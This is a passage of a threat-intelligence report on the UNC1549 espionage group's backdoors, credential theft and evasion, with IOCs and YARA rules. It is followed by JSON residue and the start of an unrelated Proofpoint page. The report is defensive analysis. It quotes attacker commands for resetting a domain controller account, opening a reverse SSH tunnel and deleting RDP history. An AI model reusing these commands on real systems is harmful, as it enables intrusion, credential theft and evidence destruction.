credentials with higher permissions. To make these phishing attempts more believable, the attackers often perform reconnaissance first, such as reviewing older emails in already compromised inboxes for legitimate password reset requests or identifying the company's internal password reset webpages, then crafted their malicious emails to mimic these authentic processes. Establish Foothold To maintain persistence within compromised networks, UNC1549 deployed several custom backdoors. Beyond MINIBIKE, which Mandiant discussed in the February 2024 blog post, the group also utilizes other custom malware such as TWOSTROKE and DEEPROOT. Significantly, Mandiant's analysis revealed that while the malware used for initial targeting and compromises was not unique, every post-exploitation payload identified, regardless of family, had a unique hash. This included instances where multiple samples of the same backdoor variant were found within the same victim network. This approach highlights UNC1549's sophistication and the considerable effort invested in customizing their tools to evade detection and complicate forensic investigations. Search Order Hijacking UNC1549 abused DLL search order hijacking to execute CRASHPAD, DCSYNCER.SLICK, GHOSTLINE, LIGHTRAIL, MINIBIKE, POLLBLEND, SIGHTGRAB, and TWOSTROKE payloads. Using the DLL search order hijacking techniques, UNC1549 achieved a persistent and stealthy way of executing their tooling. Throughout the different investigations, UNC1549 demonstrated a comprehensive understanding of software dependencies by exploiting DLL search order hijacking in multiple software solutions. UNC1549 has deployed malicious binaries targeting legitimate Fortigate, VMWare, Citrix, Microsoft, and NVIDIA executables. In many cases, the threat actor installed the legitimate software after initial access in order to abuse SOH; however, in other cases, the attacker leveraged software that was already installed on victim systems and then replaced or added the malicious DLLs within the legitimate installation directory, typically with SYSTEM privileges. TWOSTROKE TWOSTROKE, a C++ backdoor, utilizes SSL-encrypted TCP/443 connections to communicate with its controllers. This malware possesses a diverse command set, allowing for system information collection, DLL loading, file manipulation, and persistence. While showing some similarities to MINIBIKE, it's considered a unique backdoor. Upon execution of TWOSTROKE, it employs a specific routine to generate a unique victim identifier. TWOSTRIKE retrieves the fully qualified DNS computer name using the Windows API function GetComputerNameExW(ComputerNameDnsFullyQualified) . This retrieved name then undergoes an XOR encryption process, utilizing the static key. Following the encryption, the resulting binary data is converted into a lowercase hexadecimal string. Finally, TWOSTROKE extracts the first eight characters of this hexadecimal string, reverses it, and uses it as the victim's unique bot ID for later communication with the C2 server. Functionalities After sending the check in request to the C2 server, the TWOSTROKE C2 server returns with a hex-encoded payload that contains multiple values separated by \" @##@ .\" Depending on the received command, TWOSTROKE can execute one of the following commands: 1 : Upload a file to the C2 2 : Execute a file or a shell command 3 : DLL execution into memory 4 : Download file from the C2 5 : Get the full victim user name 6 : Get the full victim machine name 7 : List a directory 8 : Delete a file LIGHTRAIL UNC1549 was observed downloading a ZIP file from attacker-owned infrastructure. This ZIP file contained the LIGHTRAIL tunneler as VGAuth.dll and was executed through search order hijacking using the VGAuthCLI.exe executable. LIGHTRAIL is a custom tunneler, likely based on the open-source Socks4a proxy, Lastenzug , that communicates using Azure cloud infrastructure. There are several distinct differences between the LIGHTRAIL sample and the LastenZug source code. These include: Increasing the MAX_CONNECTIONS from 250 to 5000 Static configuration inside the lastenzug function ( wPath and port ) No support for using a proxy server when connecting to the WebSocket C2 Compiler optimizations reducing the number of functions (26 to 10) Additionally, LastenZug is using hashing for DLLs and API function resolving. By default, the hash value is XOR\u2019d with the value 0x41507712 , while the XOR value in the observed LIGHTRAIL sample differs from the original source code - 0x41424344 ( \u2018ABCD\u2019 ) . After loading the necessary API function pointers, the initialization continues by populating the server name ( wServerName ), the port, and URI ( wPath ) values. The port is hardcoded at 443 (for HTTPS) and the path is hardcoded to \" /news .\" This differs from the source code where these values are input parameters to the lastenzug function. The initWS function is responsible for establishing the WebSocket connection, which it does using the Windows WinHTTP API. The initWS function has a hard-coded User-Agent string which it constructs as a stack string: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136 Mandiant identified another LIGHTRAIL sample uploaded to VirusTotal from Germany. However, this sample seems to have been modified by the uploader as the C2 domain was intentionally altered. GET https://aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com/page HTTP/1.1 Host: aaaaaaaaaaaaaaaaaa.bbbbbb.cccccccc.ddddd.com Connection: Upgrade Upgrade: websocket User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136 Sec-WebSocket-Key: 9MeEoJ3sjbWAEed52LdRdg== Sec-WebSocket-Version: 13 Figure 2: Modified LIGHTRAIL network communication snippet Most notable is that this sample is using a different URL path for its communication, but also the User-Agent in this sample is different from the one that was observed in previous LIGHTRAIL samples and the LastenZug source code. DEEPROOT DEEPROOT is a Linux backdoor written in Golang and supports the following functionalities: shell command execution, system information enumeration and file listing, delete, upload, and download. DEEPROOT was compiled to be operating on Linux systems; however, due to Golang\u2019s architecture DEEPROOT could also be compiled for other operating systems. At the time of writing, Mandiant has not observed any DEEPROOT samples targeting Windows systems. DEEPROOT was observed using multiple C2 domains hosted in Microsoft Azure. The observed DEEPROOT samples used multiple C2 servers per binary, suspected to be used for redundancy in case one C2 server has been taken down. Functionalities After sending the check in request to the C2 server, the DEEPROOT C2 server returns with a hex-encoded payload that contains multiple values separated by \u2018 -===- \u2019 <sleep_timeout>-===-<command_id>-===-<command>-===-<argument_1>-===-<argument_2> Figure 3: Decoded POST body data structure sleep_timeout is the time in milli-seconds to wait before making the next request. command_id is an identifier for the C2 command, used by the backdoor when responding to the C2 with the result. command is the command number and it's one of the following: 1 - Get directory information (directory listing), the directory path is received in argument_1 . 2 - Delete a file, the file path is received in argument_1 . 3 - Get the victim username. 4 - Get the victim's hostname. 5 - Execute a shell command, the shell command is received in argument_1 . 6 - Download a file from the C2, the C2 file path is received in argument_1 and the local file path is received in argument_2 . 7 - Upload a file to the C2, the local file path is received in argument_1 . argument_1 and argument_2 are the command arguments and it is optional. GHOSTLINE GHOSTLINE is a Windows tunneler utility written in Golang that uses a hard-coded domain for its communication. GHOSTLINE uses the go-yamux library for its network connection. POLLBLEND POLLBLEND is a Windows tunneler that is written in C++. Earlier iterations of POLLBLEND featured multiple hardcoded C2 servers and utilized two hardcoded URI parameters for self-registration and tunneler configuration download. For the registration of the machine, POLLBLEND would reach out to /register/ and sent a HTTP POST request with the following JSON body. {\"username\": \"<computer_name>\"} Figure 4: POLLBLEND body data Code Signing Throughout the tracking of UNC1549\u2019s activity across multiple intrusions, the Iranian-backed threat group was observed signing some of their backdoor binaries with legitimate code-signing certificates\u2014a tactic also covered by Check Point \u2014likely to help their malware evade detection and bypass security controls like application allowlists, which are often configured to trust digitally signed code. The group employed this technique to weaponize malware samples, including variants for GHOSTLINE, POLLBLEND, and TWOSTROKE. All identified code-signing certificates have been reported to the relevant issuing Certificate Authorities for revocation. Escalate Privileges UNC1549 has been observed using a variety of techniques and custom tools aimed at stealing credentials and gathering sensitive data post-compromise. This included a utility, tracked as DCSYNCER.SLICK, designed to mimic the DCSync Active Directory replication feature. DCSync is a legitimate function domain controllers use for replicating changes via RPC . This allowed the attackers to extract NTLM password hashes directly from the domain controllers. Another tool, dubbed CRASHPAD, focused on extracting credentials saved within web browsers. For visual data collection, they deployed SIGHTGRAB, a tool capable of taking periodic screenshots, potentially capturing sensitive information displayed on the user's screen. Additionally, UNC1549 utilized simpler methods, such as deploying TRUSTTRAP, which presented fake popup windows prompting users to enter their credentials, which were then harvested by the attackers. UNC1549 frequently used DCSync attacks to obtain NTLM password hashes for domain users, which they then cracked in order to facilitate lateral movement and privilege escalation. To gain the necessary directory replication rights for DCSync, the threat actor employed several methods. They were observed unconventionally resetting passwords for domain controller computer accounts using net.exe . This action typically broke the domain controller functionality of the host and caused an outage, yet it successfully enabled them to perform the DCSync operation and extract sensitive credentials, including those for domain administrators and Azure AD Connect accounts. UNC1549 leveraged other techniques to gain domain replication rights, including creating rogue computer accounts and abusing Resource-Based Constrained Delegation (RBCD) assignments. They also performed Kerberoasting, utilizing obfuscated Invoke-Kerberoast scripts, for credential theft. net user DC-01$ P@ssw0rd Figure 5: Example of an UNC1549 net.exe command to reset a domain controller computer account In some cases, shortly after gaining a foothold on workstations, UNC1549 discovered vulnerable Active Directory Certificate Services templates. They used these to request certificates, allowing them to impersonate higher-privileged user accounts. UNC1549 also frequently targeted saved credentials within web browsers, either through malicious utilities or by RDP session hijacking. In the latter, the threat actor would identify which user was logged onto a system through quser.exe or wmic.exe, and then RDP to that system with the user's account to gain access to their active and unlocked web browser sessions. DCSYNCER.SLICK DCSYNCER.SLICK is a Windows executable that is based on the Open source Project DCSyncer and is based on Mimikatz source code. DCSYNCER.SLICK has been modified to use Dynamic API resolution and has all its printf statements removed. Additionally, DCSYNCER.SLICK collects and XOR-encrypts the credentials before writing them to a hardcoded filename and path. The following hardcoded filenames and paths were observed being used by DCSYNCER.SLICK: C:\\users\\public\\LOG.txt C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\LOG.txt To evade detection, UNC1549 executed the malware within the context of a compromised domain controller computer account. They achieved this compromise by manually resetting the account password. Instead of utilizing the standard netdom command, UNC1549 used the Windows command net user <computer_name> <password> . Subsequently, they used these newly acquired credentials to execute the DCSYNCER.SLICK payload. This tactic would give the false impression that replication had occurred between two legitimate domain controllers. CRASHPAD CRASHPAD is a Windows executable that is written in C++ that decrypts the content of the file config.txt into the file crash.log by impersonating the explorer.exe user privilege and through the CryptUnprotectData API . C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\crash.log C:\\Program Files\\VMware\\VMware Tools\\VMware VGAuth\\config.txt The contents of these files could not be determined because UNC1549 deleted the output after CRASHPAD was executed. The CRASHPAD configuration and output file paths were hardcoded into the sample, similar to the LOG.txt filename found in the DCSYNCER.SLICK binary. SIGHTGRAB SIGHTGRAB is a Windows executable written in C that autonomously captures screen shots at regular intervals and saves them to disk. Upon execution SIGHTGRAB loads several Windows libraries dynamically at runtime including User32.dll , Gdi32.dll , and Ole32.dll . SIGHTGRAB implements runtime API resolution through LoadLibraryA and GetProcAddress calls with encoded strings to access system functions. SIGHTGRAB uses XOR encryption with a single-byte key of 0x41 to decode API function names. SIGHTGRAB retrieves the current timestamp and uses string interpolation of YYYY-MM-DD-HH-MM on the timestamp to generate the directory name. In this newly created directory, SIGHTGRAB saves all the taken screenshots incrementally. C:\\Users\\Public\\Videos\\2025-3-7-10-17\\1.jpg C:\\Users\\Public\\Videos\\2025-3-7-10-17\\2.jpg C:\\Users\\Public\\Videos\\2025-3-7-10-17\\3.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\1.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\2.jpg C:\\Users\\Public\\Music\\2025-3-7-10-17\\3.jpg Figure 6: Examples of screenshot files created by SIGHTGRAB on disk Mandiant observed UNC1549 strategically deploy SIGHTGRAB on workstations to target users in two categories: those handling sensitive data, allowing for subsequent data exposure and exfiltration, and those with privileged access, enabling privilege escalation and access to restricted systems. TRUSTTRAP A malware that serves a Windows prompt to trick the user into submitting their credentials. The captured credentials are saved in cleartext to a file. Figure 7 shows a sample popup by TRUSTTRAP mimicking the Microsoft Outlook login window. Figure 7: Screenshot showing the fake Microsoft Outlook login window TRUSTTRAP has been used by UNC1549 since at least 2023 for obtaining user credentials used for lateral movement. Reconnaissance and Lateral Movement For internal reconnaissance, UNC1549 leveraged legitimate tools and publicly available utilities, likely to blend in with standard administrative activities. AD Explorer , a valid executable signed by Microsoft, was used to query Active Directory and inspect its configuration details. Alongside this, the group employed native Windows commands like net user and net group to enumerate specific user accounts and group memberships within the domain, and PowerShell scripts for ping and port scanning reconnaissance on specific subnets, typically those associated with privileged servers or IT administrator workstations UNC1549 uses a wide variety of methods for lateral movement, depending on restrictions within the victim environment. Most frequently, RDP was used. Mandiant also observed the use of PowerShell Remoting, Atelier Web Remote Commander (\u201cAWRC\u201d), and SCCM remote control, including execution of variants of SCCMVNC to enable SCCM remote control on systems. Atelier Web Remote Commander Atelier Web Remote Commander (AWRC) is a commercial utility for remotely managing, auditing, and supporting Windows systems. Its key distinction is its agentless design, meaning it requires no software installation or pre-configuration on the remote machine, enabling administrators to connect immediately. Leveraging the capabilities of AWRC, UNC1549 utilized this publicly available commercial tool to facilitate post-compromise activities. These activities included: Established remote connections: Used AWRC to connect remotely to targeted hosts within the compromised network Conducted reconnaissance: Employed AWRC's built-in functions to gather information by: Enumerating running services Enumerating active processes Enumerating existing RDP sessions Stole credentials: Exploited AWRC to exfiltrate sensitive browser files known to contain stored user credentials from remote systems Deployed malware: Used AWRC as a vector to transfer and deploy malware onto compromised machines SCCMVNC SCCMVNC is a tool designed to leverage the existing Remote Control feature within Microsoft System Center Configuration Manager (SCCM/ConfigMgr) to achieve a VNC-like remote access experience without requiring additional third-party modules or user consent/notifications. SCCM.exe reconfig /target:[REDACTED] Figure 8: Example of an UNC1549 executing SCCMVNC command The core functionality of SCCMVNC lies in its ability to manipulate the existing Remote Control feature of SCCM. Instead of deploying a separate VNC server or other remote access software, the tool directly interacts with and reconfigures the settings of the native SCCM Remote Control service on a client workstation. This approach leverages an already present and trusted component within the enterprise environment. A key aspect of SCCMVNC is its capacity to bypass the standard consent and notification mechanisms typically associated with SCCM Remote Control. Normally, when an SCCM remote control session is initiated, the end-user is prompted for permission, and various notification icons or connection bars are displayed. SCCMVNC effectively reconfigures the underlying SCCM settings (primarily through WMI interactions) to disable these user-facing requirements. This alteration allows for a significantly more discreet and seamless remote access experience, akin to what one might expect from a VNC connection where the user might not be immediately aware of the ongoing session. Command and Control UNC1549 continued to use Microsoft Azure Web Apps registrations and cloud infrastructure for C2. In addition to backdoors including MINIBUS, MINIBIKE, and TWOSTROKE, UNC1549 relied heavily on SSH reverse tunnels established on compromised systems to forward traffic from their C2 servers to compromised systems. This technique limited the availability of host-based artifacts during investigations, since security telemetry would only record network connections. For example, during data collection from SMB shares, outbound connections were observed from the SSH processes to port 445 on remote systems, but the actual data collected could not be confirmed due to no staging taking place within the victim environment, and object auditing being disabled. C:\\windows\\system32\\openssh\\ssh.exe[Username]@[IP Address] -p 443 -o ServerAliveInterval=60 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -N -R 1070 Figure 9: Example of an UNC1549 reverse SSH comman d Mandiant also identified evidence of UNC1549 deploying a variety of redundant remote access methods, including ZEROTIER and NGROK. In some instances, these alternative methods weren't used by the threat actor until victim organizations had performed remediation actions, suggesting they are primarily deployed to retain access. Complete Mission Espionage UNC1549's operations appear strongly motivated by espionage, with mission objectives centering around extensive data collection from targeted networks. The group actively seeks sensitive information, including network/IT documentation, intellectual property, and emails. Furthermore, UNC1549 often leverages compromised organizations as a pivot point, using their access to target other entities, particularly those within the same industry sector, effectively conducting third-party supplier and partner intrusions to further their intelligence-gathering goals. Notably, Mandiant responded to one intrusion at an organization in an unrelated sector, and assessed that the intrusion was opportunistic due to the initial spear phishing lure being related to a job at an aerospace and defense organization. This demonstrated UNC1549\u2019s ability to commit resources to expanding access and persistence in victim organizations that don\u2019t immediately meet traditional espionage goals. Defense Evasion UNC1549 frequently deleted utilities from compromised systems after execution to avoid detection and hinder investigation efforts. The deletion of forensic artifacts, including RDP connection history registry keys, was also observed. Additionally, as described earlier, the group repeatedly used SSH reverse tunnels from victim hosts back to their infrastructure, a technique which helped hide their activity from EDR agents installed on those systems. Combined, this activity demonstrated an increase in the operational security of UNC1549 over the past year. reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f Figure 10: Examples of UNC1549 commands to delete RDP connection history registry keys Acknowledgement This analysis would not have been possible without the assistance from across Google Threat Intelligence Group, Mandiant Consulting and FLARE. We would like to specifically thank Greg Sinclair and Mustafa Nasser from FLARE, and Melissa Derr, Liam Smith, Chris Eastwood, Alex Pietz, Ross Inman, and Emeka Agu from Mandiant Consulting. MITRE ATT&CK TACTIC ID Name Description Collection T1213.002 Data from Information Repositories: SharePoint UNC1549 browsed Microsoft Teams and SharePoint to download files used for extortion. Collection T1113 Screen Capture UNC1549 was observed making screenshots from sensitive data. Reconnaissance T16561598.003 Phishing for Information UNC1549 used third party vendor accounts to obtain privileged accounts using a Password Reset portal theme. Credential Access T1110.003 Brute Force: Password Spraying UNC1549 was observed performing password spray attacks against the Domain. Credential Access T1003.006 OS Credential Dumping: DCSync UNC1549 was observed using DCSYNCER.SLICK to perform DCSync on domain controller level. Defense Evasion T1574.001 Hijack Execution Flow: DLL Search Order Hijacking UNC1549 was observed using Search Order Hijacking to execute both LIGHTRAIL and DCSYNCER.SLICK. Initial Access T1078 Valid Accounts UNC1549 used valid compromised accounts to gain initial access Initial Access T1199 Trusted Relationship UNC1549 used trusted third party vendor accounts for both initial access and lateral movement. Indicators of Compromise (IOCs) The following IOCs are available in a GTI Collection for registered users. Type Indicator Description network 104.194.215[.]88 Observed being used for SSH tunneling network 13.60.50[.]172 Observed being used for SSH tunneling network 167.172.137[.]208 Observed being used for SSH tunneling network 34.18.42[.]26 Observed being used for SSH tunneling network 4.188.75[.]206 Observed being used for SSH tunneling network 4.240.113[.]27 Observed being used for SSH tunneling network 40.119.176[.]233 Observed being used for SSH tunneling network politicalanorak[.]com Observed being used for SSH tunneling network ac-connection-status105.azurewebsites[.]net GHOSTLINE network acc-cloud-connection.azurewebsites[.]net GHOSTLINE network active-az-check-status45.azurewebsites[.]net POLLBLEND network active-az-check-status675.azurewebsites[.]net POLLBLEND network active-az-status45.azurewebsites[.]net POLLBLEND network active-az-status795.azurewebsites[.]net POLLBLEND network active-internal-log65.azurewebsites[.]net POLLBLEND network active-internal-logs.azurewebsites[.]net POLLBLEND network active-intranet-logs.azurewebsites[.]net POLLBLEND network airbus.usa-careers[.]com Phishing domain for initial access network airlinecontrolsite.uaenorth.cloudapp.azure[.]com DEEPROOT network airlinecontrolsite.westus3.cloudapp.azure[.]com DEEPROOT network airplaneserviceticketings[.]com MINIBIKE network airseatregister.eastus.cloudapp.azure[.]com DEEPROOT network airseatsregister.qatarcentral.cloudapp.azure[.]com DEEPROOT network airseatsregistering.qatarcentral.cloudapp.azure[.]com DEEPROOT network airtravellog[.]com TWOSTROKE network automationagencybusiness.azurewebsites[.]net TWOSTROKE network automationagencybusiness[.]com TWOSTROKE network browsercheckap.azurewebsites[.]net MINIBIKE network codesparkle.eastus.cloudapp.azure[.]com TWOSTROKE network connect-acc-492.azurewebsites[.]net POLLBLEND network connect-acl-492.azurewebsites[.]net POLLBLEND network customerlistchange.eastus.cloudapp.azure[.]com LIGHTRAIL network developercodepro.azurewebsites[.]net TWOSTROKE network developercodevista.azurewebsites[.]net TWOSTROKE network dreamtiniventures.azurewebsites[.]net TWOSTROKE network fdtsprobusinesssolutions.azurewebsites[.]net TWOSTROKE network fdtsprobusinesssolutions[.]com TWOSTROKE network fdtsprobusinesssolutions.eastus.cloudapp.azure[.]com TWOSTROKE network fdtsprobusinesssolutions.northeurope.cloudapp.azure[.]com TWOSTROKE network forcecodestore[.]com TWOSTROKE network hserbhh43.westus3.cloudapp.azure[.]com Observed being used for SSH tunneling network infrasync-ac372.azurewebsites[.]net POLLBLEND network intra-az-check-status45.azurewebsites[.]net POLLBLEND network intra-az-check-status675.azurewebsites[.]net POLLBLEND network intra-az-status45.azurewebsites[.]net POLLBLEND network intra-az-status795.azurewebsites[.]net POLLBLEND network masterflexiblecloud.azurewebsites[.]net TWOSTROKE network mso-internal-log65.azurewebsites[.]net POLLBLEND network mso-internal-logs.azurewebsites[.]net POLLBLEND network mso-intranet-logs.azurewebsites[.]net POLLBLEND network mydocs.qatarcentral.cloudapp.azure[.]com Phishing domain for lateral movement network nx425-win4945.azurewebsites[.]net POLLBLEND network nx4542-win4957.azurewebsites[.]net POLLBLEND network nxlog-crash-1567.azurewebsites[.]net POLLBLEND network nxlog-win-1567.azurewebsites[.]net POLLBLEND network nxversion-win-1567.azurewebsites[.]net POLLBLEND network nxversion-win32-1127.azurewebsites[.]net POLLBLEND network overqatfa.northeurope.cloudapp.azure[.]com Observed being used for SSH tunneling network queuetestapplication.azurewebsites[.]net MINIBIKE network skychain13424.azurewebsites[.]net MINIBIKE network skychain41334.northeurope.cloudapp.azure[.]com MINIBIKE network skychains42745.eastus.cloudapp.azure[.]com MINIBIKE network skyticketgrant.azurewebsites[.]net MINIBIKE network snare-core.azurewebsites[.]net POLLBLEND network storageboxcloud.northeurope.cloudapp.azure[.]com TWOSTROKE network storagewiz.co.azurewebsites[.]net TWOSTROKE network swiftcode.eastus.cloudapp.azure[.]com TWOSTROKE network swifttiniventures.azurewebsites[.]net TWOSTROKE network terratechworld.eastus.cloudapp.azure[.]com TWOSTROKE network thecloudappbox.azurewebsites[.]net TWOSTROKE network thestorageboxcloud.northeurope.cloudapp.azure[.]com TWOSTROKE network thetacticstore[.]com TWOSTROKE network thevaultapp.westus3.cloudapp.azure[.]com TWOSTROKE network thevaultspace.eastus.cloudapp.azure[.]com TWOSTROKE network tini-ventures[.]com TWOSTROKE network vcphone-ms.azurewebsites[.]net POLLBLEND network vcs-news[.]com Observed being used for SSH tunneling network vm-ticket-svc.azurewebsites[.]net POLLBLEND network vm-tools-svc.azurewebsites[.]net POLLBLEND network vmware-health-ms.azurewebsites[.]net POLLBLEND YARA Rules import \"pe\" rule M_APT_Utility_DCSYNCER_SLICK_1 { meta: author = \"Google Threat Intelligence Group (GTIG)\" md5 = \"10f16991665df69d1ccd5187e027cf3d\" strings: $ = { 48 89 84 24 ?? 01 00 00 C7 84 24 ?? 01 00 00 30 80 28 00 C7 84 24 ?? 01 00 00 E8 03 00 00 48 C7 84 24 ?? 01 00 00 00 00 A0 00 BA ?? 00 00 00 8D 4A ?? FF 15 ?? ?? 01 00 48 89 84 24 ?? 01 00 00 C7 00 01 00 00 00 48 8B 84 24 ?? 01 00 00 44 89 ?? 04 48 8B 84 24 ?? 01 00 00 C7 40 08 ?? 00 00 00 41 8B ?? } $ = \"\\\\LOG.txt\" ascii wide $ = \"%ws_%d:%d:\" ascii wide fullword $ = \"%ws:%d:\" ascii wide fullword $ = \"::::\" ascii wide fullword $ = \"%ws_%d:%d::\" ascii wide fullword $ = \"%ws:%d::\" ascii wide fullword condition: pe.is_pe and all of them } import \"pe\" rule M_APT_Utility_CRASHPAD_1 { meta: author = \"Google Threat Intelligence Group (GTIG)\" md5 = \"b2bd275f97cb95c7399065b57f90bb6c\" strings: $ = \"[-] Loo ror: %u\" ascii fullword $ = \"[-] Adj r: %u\" ascii fullword $ = \"[-] Th ge. \" ascii fullword $ = \"[+] O s!\" ascii fullword $ = \"[-] O C: %i\" ascii fullword $ = \"[-] O E: %i\" ascii fullword $ = \"[+] Op cess!\" ascii fullword $ = \"[-] Op Code: %i\" ascii fullword $ = \"[-] O Error: %i\" ascii fullword $ = \"[+] Im su!\" ascii fullword $ = \"[+] R\" ascii fullword $ = \"[-] Impe Code: %i\" ascii fullword $ = \"[-] Imo: %i\" ascii fullword $ = \"[+] Du success!\" ascii fullword $ = \"[-] Du Code: %i\" ascii fullword $ = \"[-] Du Error: %i\" ascii fullword $ = \"[+] Dec Suc.\" ascii fullword $ = \"%02X\" ascii fullword $ = \"Decryption failed\" ascii fullword $ = \"config.txt\" $ = \"crash.log\" $ = \"[+] e wt!\" ascii fullword $ = \"[+] p %d!\" ascii fullword $ = \"[+] e!\" ascii fullword condition: pe.is_pe and 15 of them } Google Security Operations Detections Google SecOps customers receive robust detection for UNC1549 TTPs through curated threat intelligence from Mandiant and Google Threat Intelligence. This frontline intelligence is operationalized within the platform as custom detection signatures and advanced YARA-L rules. Posted in Threat Intelligence Related articles Threat Intelligence GTIG AI Threat Tracker: Distillation, Experimentation, and (Continued) Integration of AI for Adversarial Use By Google Threat Intelligence Group \u2022 33-minute read Threat Intelligence Beyond the Battlefield: Threats to the Defense Industrial Base By Google Threat Intelligence Group \u2022 28-minute read Threat Intelligence UNC1069 Targets Cryptocurrency Sector with New Tooling and AI-Enabled Social Engineering By Mandiant \u2022 26-minute read Threat Intelligence Vishing for Access: Tracking the Expansion of ShinyHunters-Branded SaaS Data Theft By Mandiant \u2022 15-minute read Footer Links Follow us Google Cloud Google Cloud Products Privacy Terms Cookies management controls Help Language \u202aEnglish\u202c \u202aDeutsch\u202c \u202aFran\u00e7ais\u202c \u202a\ud55c\uad6d\uc5b4\u202c \u202a\u65e5\u672c\u8a9e\u202c",
    "expected_count": 4
  },
  {
    "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
    "title": "The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One | Proofpoint US",
    "content": "The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One | Proofpoint US Skip to main content us: English: Americas Select a Language us: English: Americas English: Europe, Middle East, Africa English: Asia Pacific Espa\u00f1ol Deutsch Fran\u00e7ais Italiano Portugu\u00eas \u65e5\u672c\u8a9e \ud55c\uad6d\uc5b4 Search Partners Channel Partners and Distributors MSP Partners Technology and Alliance Partners Support Support Login Sendmail Support Login IP Address Blocked Login Training Proofpoint Cybersecurity Academy Partners Partner Hub Products Digital Risk Portal ET Intelligence Email Fraud Defense Proofpoint Essentials Back Platform Solutions Why Proofpoint Resources Company Get a Demo Contact Us Top Suggestions: Email Security Phishing DLP Email Fraud Prime Threat Protection Platform Collaboration Security Data Security and Governance Platform Technologies Services Platform Cybersecurity for the agentic workspace starts with Proofpoint\u2019s human and agent-centric security platform. Collaboration Security Defend humans and agents against modern cyber threats across email and collaboration channels. Data Security and Governance\u200b Protect the data that powers human and AI collaboration\u200b. Platform Technologies Leverage Proofpoint\u2019s market-leading technologies powering cybersecurity for people, data and AI. Featured Join a live Protect event\u2014learn how to protect people, data, and AI Live Events Collaboration Security Stop cyber threats with AI-driven multichannel protection. Discover Collaboration Security Prime Core Email Protection Activate industry-leading threat protection delivered via API or Gateway. Email Fraud Defense Protect your brand reputation, increase deliverability and identify domain lookalikes. ZenGuide Turn your workforce into your first line of defense with targeted, behavior-changing security awareness training. Secure Email Relay Secure your application email and accelerate DMARC implementation. Account Takeover Protection Detect, investigate, and respond to account takeovers. All Products Featured Experience Core Email Protection in action\u2014block 99.99% of email threats Interactive Demo Data Security and Governance Transform data security with a unified, omnichannel approach. See why Proofpoint is a leader Enterprise DLP Transform DLP with a modern platform that prevents data loss across email, cloud, and endpoints. Adaptive Email DLP Prevent misdirected emails and hidden exfiltration of sensitive data. Insider Threat Management Get visibility into risky behavior by careless, malicious and compromised users. Data Security Posture Management Discover, classify and protect sensitive data across cloud and hybrid environments. Digital Communications Governance Capture, retain and discover digital communications intelligently to ensure compliance. All Products Featured Understand the top data security risks organizations face \u2014 and how to stay ahead Research Report Platform Technologies Proofpoint technologies powering human and agent-centric security\u200b. Discover the security risks Proofpoint Nexus Advanced AI and threat intelligence to detect threats and assess data risk. Proofpoint Zen Integrated control points to protect people and data, wherever work happens. Proofpoint Satori The power behind agentic security operations. Explore Proofpoint packages How to Buy Services Optimize Proofpoint solutions with expert services. Advisory Services Give your team access to expert guidance while they manage daily operations of your Proofpoint platform. Applied Services Gain a hightouch strategic partnership with a team of Proofpoint specialists who optimize your security and monitoring. Featured \"The partnership with Proofpoint, it's an extention of our team.\" \u2013Celesta Capital Customer Story Use Case Industry Use Case Comprehensive solutions for today\u2019s cybersecurity threats. Ensure Acceptable GenAI Use Empower your workforce with safe GenAI practices. Secure Microsoft365 Implement the best security and compliance solution for Microsoft 365. Prevent Loss from Ransomware Stop attacks by securing ransomware's top vector. Combat Email and Cloud Threats Protect your people from email and cloud threats with an intelligent and holistic approach. Protect Cloud Apps Keep your people and their cloud apps secure by eliminating threats and data loss. Change User Behavior Help your employees identify, resist and report attacks before the damage is done. Modernize Compliance and Archiving Manage risk and data retention needs with a modern solution. Authenticate Your Email Protect your email deliverability with DMARC. Featured Learn about new AI risks\u2014and how to build a secure foundation for enterprise adoption White Paper Industry Superior protection for every industry, from small business to large enterprise. Federal Government Enable your agency with cybersecurity built for federal government environments. Higher Education Protect your campus, people, data, and research with advanced security. Healthcare Safeguard your clinicians, patient data, and intellectual property from advanced threats. Internet Service Providers Deliver secure, high-performance email protection for your networks and customers with Cloudmark. State and Local Government Secure your institutions, services, and communities against cyber threats. Financial Services Protect your institution while meeting regulatory and compliance requirements. Mobile Operators Secure your messaging environments and protect subscribers at scale. Small and Medium Businesses Strengthen your business with enterprise-grade security built to grow with you. Featured Discover the security risks healthcare organizations can't afford to ignore Threat Report Why Proofpoint More than 80 of the Fortune 100 choose Proofpoint to protect their people, data, and AI. Why Proofpoint Customer Stories Learn how organizations use Proofpoint to strengthen their cybersecurity, protect their data, and reduce risk. Awards See how our innovation and leadership have been recognized across the industry by leading analysts and publications. Threat Insight Blog Stay up to date on emerging cyber threats with insights from our industry-leading threat research team. Comparing Proofpoint Evaluating cybersecurity vendors? Check out our side-by-side comparison of Proofpoint vs. competitors. Evaluating security vendors? Compare us by checking out side-by-side comparisons. Comparison Overview Proofpoint vs. Abnormal Security Proofpoint vs. Mimecast Proofpoint vs. Check Point Harmony Proofpoint vs. Cisco Proofpoint vs. Symantec Proofpoint vs. Microsoft Purview Proofpoint vs. Legacy DLP Proofpoint vs. SSE Vendors Proofpoint vs. DSPM Vendors Resources Threat Intelligence Resources Research, insights and resources from Proofpoint experts. Resource Library Blog Keep up with the latest news and happenings from our industry leading experts. Cybersecurity Academy Earn your certification to become a Proofpoint Certified Guardian. Events Connect with peers in person and learn from the experts. Webinars Browse our webinar library to learn about the latest threats and issues in cybersecurity. Podcasts Listen to expert conversations and insights on cybersecurity trends, threats and best practices. Customer Stories Read how our customers solve their most pressing cybersecurity challenges Featured New Agents, New Attacks: Securing Collaboration in the Agentic Era Live Webinar Series\u2014Register Now Threat Intelligence Learn from our expert threat intelligence and insights that you won\u2019t 